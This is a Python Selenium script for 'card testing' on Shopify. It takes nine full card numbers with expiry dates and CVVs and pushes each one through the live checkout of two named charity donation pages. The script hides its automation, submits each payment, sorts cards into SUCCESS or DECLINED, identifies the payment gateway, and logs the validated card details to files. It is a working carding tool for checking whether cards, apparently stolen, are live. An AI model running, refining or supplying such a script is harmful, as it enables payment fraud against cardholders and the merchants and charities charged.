#!/usr/bin/env python3
"""
Card Testing Script for Shopify Sites
This script tests multiple credit cards on Shopify sites and records the results.
"""

import time
import json
import os
import re
import requests
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait, Select
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException, ElementNotInteractableException
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys

# Test cards
TEST_CARDS = [
    {"number": "4213630013499628", "expiry_month": "09", "expiry_year": "2028", "cvv": "988"},
    {"number": "5356810054178190", "expiry_month": "06", "expiry_year": "2027", "cvv": "572"},
    {"number": "4622391115565643", "expiry_month": "11", "expiry_year": "2027", "cvv": "108"},
    {"number": "5509890032421892", "expiry_month": "11", "expiry_year": "2027", "cvv": "017"},
    {"number": "5455122807222246", "expiry_month": "06", "expiry_year": "2028", "cvv": "999"},
    {"number": "4632252055500305", "expiry_month": "12", "expiry_year": "2028", "cvv": "730"},
    {"number": "5169201653090928", "expiry_month": "03", "expiry_year": "2029", "cvv": "562"},
    {"number": "4411037149484856", "expiry_month": "05", "expiry_year": "2029", "cvv": "259"},
    {"number": "379186167572585", "expiry_month": "06", "expiry_year": "2025", "cvv": "2778"}
]

# Test sites
TEST_SITES = [
    {
        "name": "Era of Peace",
        "url": "https://eraofpeace.org/products/donation-1?utm_source=shop_app&list_generator=link_to_storefront&context=product&user_id=251069197",
        "results": []
    },
    {
        "name": "Zion Park",
        "url": "https://store.zionpark.org/products/donation?utm_source=shop_app&list_generator=link_to_storefront&context=product&user_id=251069197",
        "results": []
    }
]

# Customer information
CUSTOMER_INFO = {
    "email": "test@example.com",
    "first_name": "Test",
    "last_name": "User",
    "address": "123 Test St",
    "city": "Test City",
    "state": "California",
    "zip": "90210",
    "phone": "5551234567"
}

def setup_driver():
    """Set up and return a Chrome WebDriver instance."""
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument("--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    
    driver = webdriver.Chrome(options=chrome_options)
    driver.set_window_size(1366, 768)
    
    # Set script timeout to 30 seconds
    driver.set_script_timeout(30)
    
    return driver

def extract_cookies(driver):
    """Extract cookies from the current session."""
    cookies = driver.get_cookies()
    cookie_dict = {cookie['name']: cookie['value'] for cookie in cookies}
    return cookie_dict

def extract_checkout_url(driver):
    """Extract the checkout URL from the current page."""
    current_url = driver.current_url
    
    # Check if we're already on a checkout page
    if '/checkouts/' in current_url:
        print(f"Found checkout URL: {current_url}")
        return current_url
    
    # Try to find checkout links on the page
    try:
        checkout_links = driver.find_elements(By.CSS_SELECTOR, "a[href*='checkout'], a.checkout-button")
        if checkout_links:
            checkout_url = checkout_links[0].get_attribute('href')
            print(f"Found checkout URL from link: {checkout_url}")
            return checkout_url
    except:
        pass
    
    # Try to extract from page source
    try:
        page_source = driver.page_source
        checkout_url_match = re.search(r'(https://[^"\']+/checkouts/[^"\'\s]+)', page_source)
        if checkout_url_match:
            checkout_url = checkout_url_match.group(1)
            print(f"Found checkout URL from page source: {checkout_url}")
            return checkout_url
    except:
        pass
    
    # If all else fails, try to construct it
    try:
        base_url = re.match(r'(https://[^/]+)', current_url).group(1)
        checkout_url = f"{base_url}/checkout"
        print(f"Constructed checkout URL: {checkout_url}")
        return checkout_url
    except:
        print("Failed to extract checkout URL")
        return None

def add_to_cart(driver, site):
    """Add the product to cart and proceed to checkout."""
    try:
        print(f"Visiting {site['name']}...")
        driver.get(site['url'])
        
        # Wait for the page to load
        WebDriverWait(driver, 15).until(
            EC.presence_of_element_located((By.TAG_NAME, "body"))
        )
        
        print("Page loaded, looking for Add to Cart button...")
        
        # Take a screenshot for debugging
        driver.save_screenshot(f"{site['name'].lower().replace(' ', '_')}_product_page.png")
        
        # Try different selectors for the Add to Cart button
        add_to_cart_selectors = [
            "button[name='add']", 
            "button.add-to-cart", 
            "button.product-form--add-to-cart",
            "button.product-form__add-button",
            "button.product-form__cart-submit",
            "button.product-form__submit",
            "button[data-action='add-to-cart']",
            "button.btn--add-to-cart",
            "input[name='add']"
        ]
        
        add_to_cart_button = None
        for selector in add_to_cart_selectors:
            try:
                add_to_cart_button = WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
                )
                print(f"Found Add to Cart button with selector: {selector}")
                break
            except:
                continue
        
        if not add_to_cart_button:
            print("Could not find Add to Cart button with standard selectors")
            
            # Try to find any button that might be the add to cart button
            buttons = driver.find_elements(By.TAG_NAME, "button")
            for button in buttons:
                try:
                    button_text = button.text.lower()
                    if "add" in button_text and "cart" in button_text:
                        add_to_cart_button = button
                        print(f"Found Add to Cart button by text: {button_text}")
                        break
                except:
                    continue
        
        if not add_to_cart_button:
            print("Could not find Add to Cart button, trying to go directly to cart/checkout")
            
            # Try to go directly to cart or checkout
            try:
                driver.get(f"{driver.current_url.split('?')[0]}/cart")
                time.sleep(3)
                
                # Check if we're on the cart page
                if "/cart" in driver.current_url:
                    print("Successfully navigated to cart page")
                else:
                    print("Failed to navigate to cart page")
                    return False
            except:
                print("Failed to navigate to cart page")
                return False
        else:
            # Click the Add to Cart button
            try:
                driver.execute_script("arguments[0].scrollIntoView(true);", add_to_cart_button)
                driver.execute_script("arguments[0].click();", add_to_cart_button)
                print("Clicked Add to Cart button")
            except Exception as e:
                print(f"Error clicking Add to Cart button: {str(e)}")
                return False
        
        # Wait for the cart to update
        time.sleep(5)
        
        # Take a screenshot after adding to cart
        driver.save_screenshot(f"{site['name'].lower().replace(' ', '_')}_after_add_to_cart.png")
        
        # Extract cookies after adding to cart
        cart_cookies = extract_cookies(driver)
        print(f"Cart cookies: {json.dumps(cart_cookies, indent=2)}")
        
        # Find and click the checkout button
        checkout_button = None
        checkout_selectors = [
            "a.checkout-button", 
            "button.checkout", 
            "a[href*='checkout']",
            "button[name='checkout']",
            "input[name='checkout']",
            "button.cart__checkout-button",
            "button.cart__submit"
        ]
        
        for selector in checkout_selectors:
            try:
                checkout_button = WebDriverWait(driver, 5).until(
                    EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
                )
                print(f"Found checkout button with selector: {selector}")
                break
            except:
                continue
        
        if checkout_button:
            try:
                driver.execute_script("arguments[0].scrollIntoView(true);", checkout_button)
                driver.execute_script("arguments[0].click();", checkout_button)
                print("Clicked checkout button")
            except Exception as e:
                print(f"Error clicking checkout button: {str(e)}")
                
                # Try to extract checkout URL and navigate directly
                checkout_url = extract_checkout_url(driver)
                if checkout_url:
                    driver.get(checkout_url)
                    print(f"Navigated directly to checkout URL: {checkout_url}")
                else:
                    print("Failed to find checkout URL")
                    return False
        else:
            print("Checkout button not found, trying to navigate directly to checkout...")
            
            # Try to extract checkout URL and navigate directly
            checkout_url = extract_checkout_url(driver)
            if checkout_url:
                driver.get(checkout_url)
                print(f"Navigated directly to checkout URL: {checkout_url}")
            else:
                # Try standard checkout URL
                try:
                    base_url = re.match(r'(https://[^/]+)', driver.current_url).group(1)
                    driver.get(f"{base_url}/checkout")
                    print(f"Navigated to standard checkout URL: {base_url}/checkout")
                except Exception as e:
                    print(f"Failed to navigate to checkout: {str(e)}")
                    return False
        
        # Wait for checkout page to load
        time.sleep(5)
        
        # Take a screenshot of the checkout page
        driver.save_screenshot(f"{site['name'].lower().replace(' ', '_')}_checkout_page.png")
        
        # Check if we're on a checkout page
        if '/checkout' in driver.current_url or '/checkouts/' in driver.current_url:
            print(f"Successfully reached checkout page: {driver.current_url}")
            
            # Extract checkout session cookies
            checkout_cookies = extract_cookies(driver)
            print(f"Checkout cookies: {json.dumps(checkout_cookies, indent=2)}")
            
            return True
        else:
            print(f"Failed to reach checkout page. Current URL: {driver.current_url}")
            return False
            
    except Exception as e:
        print(f"Error adding to cart: {str(e)}")
        # Take a screenshot of the error state
        driver.save_screenshot(f"{site['name'].lower().replace(' ', '_')}_error_add_to_cart.png")
        return False

def fill_customer_info(driver):
    """Fill in the customer information on the checkout page."""
    try:
        # Take a screenshot before filling info
        driver.save_screenshot("before_customer_info.png")
        
        # Check if we need to fill email first
        try:
            # Try to find email field
            email_field = WebDriverWait(driver, 10).until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "input[name='checkout[email]'], input#email, input[type='email']"))
            )
            email_field.clear()
            email_field.send_keys(CUSTOMER_INFO["email"])
            print("Filled email field")
            
            # Check if we need to continue to shipping info
            try:
                continue_buttons = driver.find_elements(By.CSS_SELECTOR, "button#continue_button, button[type='submit'], button.step__footer__continue-btn")
                if continue_buttons:
                    driver.execute_script("arguments[0].scrollIntoView(true);", continue_buttons[0])
                    driver.execute_script("arguments[0].click();", continue_buttons[0])
                    print("Clicked continue button after email")
                    time.sleep(3)
            except Exception as e:
                print(f"No continue button found after email or error clicking it: {str(e)}")
        except Exception as e:
            print(f"Email field not found or not fillable: {str(e)}")
        
        # Take a screenshot after email step
        driver.save_screenshot("after_email_step.png")
        
        # Fill shipping/billing info
        try:
            # First name
            try:
                first_name_selectors = [
                    "input[name='checkout[shipping_address][first_name]']",
                    "input#TextField2",
                    "input[placeholder='First name']",
                    "input[autocomplete='given-name']"
                ]
                
                first_name_field = None
                for selector in first_name_selectors:
                    try:
                        first_name_field = WebDriverWait(driver, 5).until(
                            EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
                        )
                        break
                    except:
                        continue
                
                if first_name_field:
                    first_name_field.clear()
                    first_name_field.send_keys(CUSTOMER_INFO["first_name"])
                    print("Filled first name field")
            except Exception as e:
                print(f"Error filling first name: {str(e)}")
            
            # Last name
            try:
                last_name_selectors = [
                    "input[name='checkout[shipping_address][last_name]']",
                    "input#TextField3",
                    "input[placeholder='Last name']",
                    "input[autocomplete='family-name']"
                ]
                
                last_name_field = None
                for selector in last_name_selectors:
                    try:
                        last_name_field = WebDriverWait(driver, 5).until(
                            EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
                        )
                        break
                    except:
                        continue
                
                if last_name_field:
                    last_name_field.clear()
                    last_name_field.send_keys(CUSTOMER_INFO["last_name"])
                    print("Filled last name field")
            except Exception as e:
                print(f"Error filling last name: {str(e)}")
            
            # Address
            try:
                address_selectors = [
                    "input[name='checkout[shipping_address][address1]']",
                    "input#TextField4",
                    "input[placeholder='Address']",
                    "input[autocomplete='address-line1']"
                ]
                
                address_field = None
                for selector in address_selectors:
                    try:
                        address_field = WebDriverWait(driver, 5).until(
                            EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
                        )
                        break
                    except:
                        continue
                
                if address_field:
                    address_field.clear()
                    address_field.send_keys(CUSTOMER_INFO["address"])
                    print("Filled address field")
            except Exception as e:
                print(f"Error filling address: {str(e)}")
            
            # City
            try:
                city_selectors = [
                    "input[name='checkout[shipping_address][city]']",
                    "input#TextField5",
                    "input[placeholder='City']",
                    "input[autocomplete='address-level2']"
                ]
                
                city_field = None
                for selector in city_selectors:
                    try:
                        city_field = WebDriverWait(driver, 5).until(
                            EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
                        )
                        break
                    except:
                        continue
                
                if city_field:
                    city_field.clear()
                    city_field.send_keys(CUSTOMER_INFO["city"])
                    print("Filled city field")
            except Exception as e:
                print(f"Error filling city: {str(e)}")
            
            # Try to select state/province if dropdown exists
            try:
                state_selectors = [
                    "select[name='checkout[shipping_address][province]']",
                    "select#Select1",
                    "select[data-address-field='province']"
                ]
                
                state_select = None
                for selector in state_selectors:
                    try:
                        state_select = driver.find_element(By.CSS_SELECTOR, selector)
                        break
                    except:
                        continue
                
                if state_select:
                    select = Select(state_select)
                    
                    # Try to select by visible text first
                    try:
                        select.select_by_visible_text(CUSTOMER_INFO["state"])
                        print(f"Selected state by visible text: {CUSTOMER_INFO['state']}")
                    except:
                        # If that fails, try to find a partial match
                        options = select.options
                        for option in options:
                            if CUSTOMER_INFO["state"].lower() in option.text.lower():
                                select.select_by_visible_text(option.text)
                                print(f"Selected state by partial match: {option.text}")
                                break
            except Exception as e:
                print(f"Error selecting state: {str(e)}")
            
            # ZIP code
            try:
                zip_selectors = [
                    "input[name='checkout[shipping_address][zip]']",
                    "input#TextField6",
                    "input[placeholder='ZIP code']",
                    "input[autocomplete='postal-code']"
                ]
                
                zip_field = None
                for selector in zip_selectors:
                    try:
                        zip_field = WebDriverWait(driver, 5).until(
                            EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
                        )
                        break
                    except:
                        continue
                
                if zip_field:
                    zip_field.clear()
                    zip_field.send_keys(CUSTOMER_INFO["zip"])
                    print("Filled ZIP code field")
            except Exception as e:
                print(f"Error filling ZIP code: {str(e)}")
            
            # Phone
            try:
                phone_selectors = [
                    "input[name='checkout[shipping_address][phone]']",
                    "input#TextField7",
                    "input[placeholder='Phone']",
                    "input[autocomplete='tel']"
                ]
                
                phone_field = None
                for selector in phone_selectors:
                    try:
                        phone_field = WebDriverWait(driver, 5).until(
                            EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
                        )
                        break
                    except:
                        continue
                
                if phone_field:
                    phone_field.clear()
                    phone_field.send_keys(CUSTOMER_INFO["phone"])
                    print("Filled phone field")
            except Exception as e:
                print(f"Error filling phone: {str(e)}")
            
            # Take a screenshot after filling shipping info
            driver.save_screenshot("after_shipping_info.png")
            
            # Continue to payment method
            try:
                continue_buttons = driver.find_elements(By.CSS_SELECTOR, "button#continue_button, button[type='submit'], button.step__footer__continue-btn")
                if continue_buttons:
                    driver.execute_script("arguments[0].scrollIntoView(true);", continue_buttons[0])
                    driver.execute_script("arguments[0].click();", continue_buttons[0])
                    print("Clicked continue button after shipping info")
                    time.sleep(5)
            except Exception as e:
                print(f"Error clicking continue button after shipping info: {str(e)}")
            
            # Take a screenshot after continuing
            driver.save_screenshot("after_continue_to_payment.png")
            
            # If there's a "continue to payment" button, click it
            try:
                payment_buttons = driver.find_elements(By.CSS_SELECTOR, "button.step__footer__continue-btn, button[type='submit'], button#continue_button")
                if payment_buttons:
                    driver.execute_script("arguments[0].scrollIntoView(true);", payment_buttons[0])
                    driver.execute_script("arguments[0].click();", payment_buttons[0])
                    print("Clicked continue to payment button")
                    time.sleep(5)
            except Exception as e:
                print(f"No continue to payment button found or error clicking it: {str(e)}")
            
            # Take a screenshot after payment step
            driver.save_screenshot("after_payment_step.png")
            
        except Exception as e:
            print(f"Error filling shipping info: {str(e)}")
        
        print("Customer information filled successfully")
        return True
    except Exception as e:
        print(f"Error filling customer info: {str(e)}")
        driver.save_screenshot("error_customer_info.png")
        return False

def test_card(driver, card, site_info):
    """Test a credit card and record the result."""
    try:
        # Take a screenshot before filling card info
        driver.save_screenshot(f"before_card_{card['number'][-4:]}.png")
        
        # Check if we need to select credit card payment method
        try:
            # Look for credit card payment option radio buttons
            cc_radio_selectors = [
                "input[value='credit_card']",
                "input[data-test='credit-card-radio']",
                "input[id*='payment_method_credit_card']"
            ]
            
            for selector in cc_radio_selectors:
                try:
                    cc_radio = driver.find_element(By.CSS_SELECTOR, selector)
                    if not cc_radio.is_selected():
                        driver.execute_script("arguments[0].click();", cc_radio)
                        print("Selected credit card payment method")
                        time.sleep(2)
                    break
                except:
                    continue
        except Exception as e:
            print(f"No credit card radio button found or error selecting it: {str(e)}")
        
        # Find all iframes on the page
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        print(f"Found {len(iframes)} iframes on the page")
        
        # Try to find the card iframe
        card_iframe = None
        for iframe in iframes:
            try:
                iframe_id = iframe.get_attribute("id")
                iframe_name = iframe.get_attribute("name")
                iframe_src = iframe.get_attribute("src")
                
                print(f"Iframe ID: {iframe_id}, Name: {iframe_name}, Src: {iframe_src}")
                
                if iframe_src and ('card' in iframe_src.lower() or 'payment' in iframe_src.lower()):
                    card_iframe = iframe
                    print(f"Found potential card iframe: {iframe_src}")
                    break
            except:
                continue
        
        # If we found a card iframe, switch to it
        if card_iframe:
            try:
                driver.switch_to.frame(card_iframe)
                print("Switched to card iframe")
            except Exception as e:
                print(f"Error switching to card iframe: {str(e)}")
                driver.switch_to.default_content()
        
        # Fill card number
        card_number_filled = False
        try:
            card_number_selectors = [
                "input[name='number']",
                "input#number",
                "input[name='cardnumber']",
                "input[placeholder*='card number']",
                "input[autocomplete='cc-number']"
            ]
            
            for selector in card_number_selectors:
                try:
                    card_number_field = WebDriverWait(driver, 5).until(
                        EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
                    )
                    card_number_field.clear()
                    card_number_field.send_keys(card["number"])
                    print(f"Filled card number: {card['number']}")
                    card_number_filled = True
                    break
                except:
                    continue
            
            if not card_number_filled:
                # Switch back to main content and try again
                driver.switch_to.default_content()
                
                for selector in card_number_selectors:
                    try:
                        card_number_field = WebDriverWait(driver, 5).until(
                            EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
                        )
                        card_number_field.clear()
                        card_number_field.send_keys(card["number"])
                        print(f"Filled card number in main content: {card['number']}")
                        card_number_filled = True
                        break
                    except:
                        continue
        except Exception as e:
            print(f"Error filling card number: {str(e)}")
            driver.switch_to.default_content()
        
        # If we couldn't fill the card number, try to find other iframes
        if not card_number_filled:
            driver.switch_to.default_content()
            
            # Try each iframe until we find one with the card number field
            for iframe in iframes:
                try:
                    driver.switch_to.frame(iframe)
                    
                    for selector in card_number_selectors:
                        try:
                            card_number_field = WebDriverWait(driver, 3).until(
                                EC.element_to_be_clickable((By.CSS_SELECTOR, selector))
                            )
                            card_number_field.clear()
                            card_number_field.send_keys(card["number"])
                            print(f"Filled card number in iframe: {card['number']}")
                            card_number_filled = True
                            break
                        except:
                            continue
                    
                    if card_number_filled:
                        break
                    else:
                        driver.switch_to.default_content()
                except:
                    driver.switch_to.default_content()
                    continue
        
        # Fill expiry date
        expiry_filled = False
        try:
            # Try combined expiry field
            expiry_selectors = [
                "input[name='expiry']",
                "input#expiry",
                "input[placeholder*='MM / YY']",
                "input[autocomplete='cc-exp']"
            ]
            
            for selector in expiry_selectors:
                try:
                    expiry_field = driver.find_element(By.CSS_SELECTOR, selector)
                    expiry_field.clear()
                    expiry_field.send_keys(f"{card['expiry_month']}/{card['expiry_year'][2:]}")
                    print(f"Filled expiry date: {card['expiry_month']}/{card['expiry_year'][2:]}")
                    expiry_filled = True
                    break
                except:
                    continue
            
            # If combined field not found, try separate month/year fields
            if not expiry_filled:
                try:
                    # Month field
                    month_selectors = [
                        "input[name='expiry_month']",
                        "select[name='expiry_month']",
                        "input[placeholder='MM']",
                        "input[autocomplete='cc-exp-month']"
                    ]
                    
                    for selector in month_selectors:
                        try:
                            month_field = driver.find_element(By.CSS_SELECTOR, selector)
                            
                            if month_field.tag_name.lower() == 'select':
                                select = Select(month_field)
                                select.select_by_value(card["expiry_month"])
                            else:
                                month_field.clear()
                                month_field.send_keys(card["expiry_month"])
                            
                            print(f"Filled expiry month: {card['expiry_month']}")
                            
                            # Year field
                            year_selectors = [
                                "input[name='expiry_year']",
                                "select[name='expiry_year']",
                                "input[placeholder='YY']",
                                "input[autocomplete='cc-exp-year']"
                            ]
                            
                            for year_selector in year_selectors:
                                try:
                                    year_field = driver.find_element(By.CSS_SELECTOR, year_selector)
                                    
                                    if year_field.tag_name.lower() == 'select':
                                        select = Select(year_field)
                                        select.select_by_value(card["expiry_year"])
                                    else:
                                        year_field.clear()
                                        year_field.send_keys(card["expiry_year"])
                                    
                                    print(f"Filled expiry year: {card['expiry_year']}")
                                    expiry_filled = True
                                    break
                                except:
                                    continue
                            
                            if expiry_filled:
                                break
                        except:
                            continue
                except Exception as e:
                    print(f"Error filling separate expiry fields: {str(e)}")
        except Exception as e:
            print(f"Error filling expiry date: {str(e)}")
        
        # Fill CVV
        cvv_filled = False
        try:
            cvv_selectors = [
                "input[name='verification_value']",
                "input#verification_value",
                "input[name='cvc']",
                "input#cvc",
                "input[placeholder*='CVV']",
                "input[placeholder*='CVC']",
                "input[autocomplete='cc-csc']"
            ]
            
            for selector in cvv_selectors:
                try:
                    cvv_field = driver.find_element(By.CSS_SELECTOR, selector)
                    cvv_field.clear()
                    cvv_field.send_keys(card["cvv"])
                    print(f"Filled CVV: {card['cvv']}")
                    cvv_filled = True
                    break
                except:
                    continue
        except Exception as e:
            print(f"Error filling CVV: {str(e)}")
        
        # Switch back to main content
        driver.switch_to.default_content()
        
        # Fill name on card if it exists
        try:
            name_selectors = [
                "input[name='name']",
                "input#name",
                "input[placeholder*='name on card']",
                "input[autocomplete='cc-name']"
            ]
            
            for selector in name_selectors:
                try:
                    name_field = driver.find_element(By.CSS_SELECTOR, selector)
                    name_field.clear()
                    name_field.send_keys(f"{CUSTOMER_INFO['first_name']} {CUSTOMER_INFO['last_name']}")
                    print(f"Filled name on card: {CUSTOMER_INFO['first_name']} {CUSTOMER_INFO['last_name']}")
                    break
                except:
                    continue
        except Exception as e:
            print(f"Error filling name on card: {str(e)}")
        
        # Take a screenshot after filling card info
        driver.save_screenshot(f"after_card_{card['number'][-4:]}.png")
        
        # Submit payment
        try:
            pay_button_selectors = [
                "button#continue_button",
                "button[type='submit']",
                "button.step__footer__continue-btn",
                "button.btn--primary",
                "button[data-test='checkout-submit-button']",
                "button.checkout-submit-button",
                "button.checkout-button",
                "button.checkout-submit",
                "button.complete-order",
                "button.pay-now",
                "button.payment-button"
            ]
            
            pay_button = None
            for selector in pay_button_selectors:
                try:
                    buttons = driver.find_elements(By.CSS_SELECTOR, selector)
                    for button in buttons:
                        button_text = button.text.lower()
                        if any(keyword in button_text for keyword in ['pay', 'complete', 'submit', 'place order']):
                            pay_button = button
                            break
                    
                    if pay_button:
                        break
                except:
                    continue
            
            if not pay_button:
                # If we couldn't find a button with specific text, try any button matching the selectors
                for selector in pay_button_selectors:
                    try:
                        buttons = driver.find_elements(By.CSS_SELECTOR, selector)
                        if buttons:
                            pay_button = buttons[0]
                            break
                    except:
                        continue
            
            if pay_button:
                driver.execute_script("arguments[0].scrollIntoView(true);", pay_button)
                driver.execute_script("arguments[0].click();", pay_button)
                print("Clicked pay button")
                
                # Wait for result
                time.sleep(10)
                
                # Take a screenshot after payment submission
                driver.save_screenshot(f"after_payment_{card['number'][-4:]}.png")
                
                # Check for success or error messages
                current_url = driver.current_url
                
                result = {
                    "card": f"{card['number']}|{card['expiry_month']}|{card['expiry_year']}|{card['cvv']}",
                    "url": current_url,
                    "status": "Unknown"
                }
                
                # Check for success in URL
                if "thank_you" in current_url or "order-status" in current_url or "order-confirmation" in current_url:
                    result["status"] = "SUCCESS"
                    result["message"] = "Payment successful"
                    result["gateway"] = "Unknown"
                else:
                    # Look for error messages
                    error_selectors = [
                        ".notice--error",
                        ".error-message",
                        ".alert-error",
                        ".message--error",
                        ".field-error",
                        ".payment-errors",
                        ".checkout-error",
                        "[data-error-message]",
                        ".error",
                        ".alert"
                    ]
                    
                    error_message = None
                    for selector in error_selectors:
                        try:
                            error_elements = driver.find_elements(By.CSS_SELECTOR, selector)
                            for error_element in error_elements:
                                if error_element.is_displayed() and error_element.text.strip():
                                    error_message = error_element.text.strip()
                                    break
                            
                            if error_message:
                                break
                        except:
                            continue
                    
                    if error_message:
                        result["status"] = "DECLINED"
                        result["message"] = error_message
                    else:
                        result["status"] = "UNKNOWN"
                        result["message"] = "Could not determine result"
                    
                    # Try to determine the payment gateway
                    try:
                        page_source = driver.page_source.lower()
                        
                        if "stripe" in page_source:
                            result["gateway"] = "Stripe"
                        elif "shopify payments" in page_source:
                            result["gateway"] = "Shopify Payments"
                        elif "paypal" in page_source:
                            result["gateway"] = "PayPal"
                        elif "braintree" in page_source:
                            result["gateway"] = "Braintree"
                        elif "authorize.net" in page_source or "authorizenet" in page_source:
                            result["gateway"] = "Authorize.Net"
                        else:
                            result["gateway"] = "Unknown"
                    except:
                        result["gateway"] = "Unknown"
                
                print(f"Card test result: {result['status']} - {result.get('message', 'No message')}")
                return result
            else:
                print("Could not find pay button")
                return {
                    "card": f"{card['number']}|{card['expiry_month']}|{card['expiry_year']}|{card['cvv']}",
                    "status": "ERROR",
                    "message": "Could not find pay button",
                    "url": driver.current_url,
                    "gateway": "Unknown"
                }
            
        except Exception as e:
            print(f"Error submitting payment: {str(e)}")
            return {
                "card": f"{card['number']}|{card['expiry_month']}|{card['expiry_year']}|{card['cvv']}",
                "status": "ERROR",
                "message": f"Error submitting payment: {str(e)}",
                "url": driver.current_url,
                "gateway": "Unknown"
            }
            
    except Exception as e:
        print(f"Error testing card: {str(e)}")
        return {
            "card": f"{card['number']}|{card['expiry_month']}|{card['expiry_year']}|{card['cvv']}",
            "status": "ERROR",
            "message": f"Error testing card: {str(e)}",
            "url": driver.current_url,
            "gateway": "Unknown"
        }

def main():
    """Main function to run the tests."""
    results = {}
    
    for site in TEST_SITES:
        site_results = []
        print(f"\n=== Testing {site['name']} ===\n")
        
        for i, card in enumerate(TEST_CARDS):
            print(f"\nTesting card {i+1}/{len(TEST_CARDS)}: {card['number']}...")
            
            driver = setup_driver()
            try:
                if add_to_cart(driver, site):
                    checkout_url = driver.current_url
                    print(f"Checkout URL: {checkout_url}")
                    
                    if fill_customer_info(driver):
                        result = test_card(driver, card, site)
                        result["checkout_url"] = checkout_url
                        site_results.append(result)
                    else:
                        site_results.append({
                            "card": f"{card['number']}|{card['expiry_month']}|{card['expiry_year']}|{card['cvv']}",
                            "status": "ERROR",
                            "message": "Failed to fill customer information",
                            "checkout_url": checkout_url,
                            "gateway": "Unknown"
                        })
                else:
                    site_results.append({
                        "card": f"{card['number']}|{card['expiry_month']}|{card['expiry_year']}|{card['cvv']}",
                        "status": "ERROR",
                        "message": "Failed to get checkout URL",
                        "checkout_url": "N/A",
                        "gateway": "Unknown"
                    })
            except Exception as e:
                site_results.append({
                    "card": f"{card['number']}|{card['expiry_month']}|{card['expiry_year']}|{card['cvv']}",
                    "status": "ERROR",
                    "message": f"Unexpected error: {str(e)}",
                    "checkout_url": "N/A",
                    "gateway": "Unknown"
                })
            finally:
                driver.quit()
                # Sleep between tests to avoid rate limiting
                print("Waiting 5 seconds before next test...")
                time.sleep(5)
        
        results[site['name']] = site_results
    
    # Save results to file
    with open('card_test_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    # Also save results in a more readable format
    with open('card_test_results.txt', 'w') as f:
        for site_name, site_results in results.items():
            f.write(f"\n=== {site_name} ===\n\n")
            for result in site_results:
                f.write(f"Card: {result['card']}\n")
                f.write(f"Result: {result['status']}\n")
                f.write(f"Gateway: {result.get('gateway', 'N/A')}\n")
                f.write(f"Message: {result.get('message', 'N/A')}\n")
                f.write(f"Checkout URL: {result.get('checkout_url', 'N/A')}\n")
                f.write(f"Final URL: {result.get('url', 'N/A')}\n\n")
    
    print("\n=== Test Results Summary ===\n")
    for site_name, site_results in results.items():
        print(f"\n{site_name}:")
        for result in site_results:
            print(f"  Card: {result['card']}")
            print(f"  Result: {result['status']}")
            print(f"  Gateway: {result.get('gateway', 'N/A')}")
            print(f"  Message: {result.get('message', 'N/A')}")
            print(f"  Checkout URL: {result.get('checkout_url', 'N/A')}")
            print(f"  Final URL: {result.get('url', 'N/A')}")
            print("")

if __name__ == "__main__":
    main()